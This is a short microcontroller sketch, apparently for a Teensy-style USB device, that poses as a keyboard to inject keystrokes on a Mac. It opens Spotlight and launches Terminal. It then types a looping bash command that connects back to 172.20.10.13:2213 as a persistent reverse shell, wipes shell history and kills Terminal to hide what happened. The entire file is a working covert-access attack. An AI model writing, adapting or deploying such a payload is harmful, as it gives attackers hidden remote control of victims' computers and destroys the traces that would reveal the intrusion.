#include "Keyboard.h"
const int LED = 13;
void setup() {
	pinMode(LED, OUTPUT);
	Serial.begin(9600);
	delay(1000); //delay to establish connection
	Keyboard.set_modifier(MODIFIERKEY_GUI);
	Keyboard.set_key1(KEY_SPACE);
	Keyboard.send_now();
	Keyboard.set_modifier(0);
	Keyboard.set_key1(0);
	Keyboard.send_now();
	delay(200);
	Keyboard.print("terminal");
	delay(1000);
	keyEnter();
	delay(1000);
	Keyboard.print("while true; do $(bash &> /dev/tcp/172.20.10.13/2213 0>&1); sleep 5; done & history -wc;killall Terminal");
	keyEnter();
}

void keyEnter() {
	Keyboard.set_key1(KEY_ENTER);
	Keyboard.send_now();
	Keyboard.set_key1(0);
	Keyboard.send_now();
}

void loop() {
	digitalWrite(LED, HIGH);
	delay(100);
	digitalWrite(LED, LOW);
	delay(100);
}